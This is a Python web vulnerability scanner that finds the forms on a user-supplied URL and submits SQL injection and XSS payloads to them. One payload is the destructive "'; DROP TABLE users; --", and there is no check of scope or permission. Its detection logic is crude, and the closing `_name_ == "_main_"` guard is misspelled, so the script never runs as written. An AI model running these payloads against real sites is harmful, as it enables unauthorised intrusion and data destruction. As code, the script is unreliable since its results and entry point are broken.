import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Common payloads
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", '" OR "1"="1']
XSS_PAYLOADS = ['<script>alert("XSS")</script>', '"><script>alert(1)</script>']

def get_forms(url):
    """Extract all form tags from a web page."""
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Extract useful form data."""
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        if name:
            inputs.append({"type": input_type, "name": name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    """Submit a form with a given payload."""
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = value
        else:
            data[input["name"]] = "test"
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    return requests.get(target_url, params=data)

def scan_xss(url):
    """Scan for XSS vulnerabilities."""
    forms = get_forms(url)
    print(f"[+] Found {len(forms)} forms on {url}")
    for form in forms:
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if payload in response.text:
                print(f"[!] XSS vulnerability found on {url}")
                print(f"    Payload: {payload}")
                break

def scan_sqli(url):
    """Scan for SQL Injection vulnerabilities."""
    forms = get_forms(url)
    print(f"[+] Found {len(forms)} forms on {url}")
    for form in forms:
        form_details = get_form_details(form)
        for payload in SQLI_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if "sql" in response.text.lower() or "error" in response.text.lower():
                print(f"[!] SQL Injection vulnerability found on {url}")
                print(f"    Payload: {payload}")
                break

def main():
    target = input("Enter target URL: ")
    print("\n--- Scanning for XSS ---")
    scan_xss(target)
    print("\n--- Scanning for SQL Injection ---")
    scan_sqli(target)

if _name_ == "_main_":
    main()
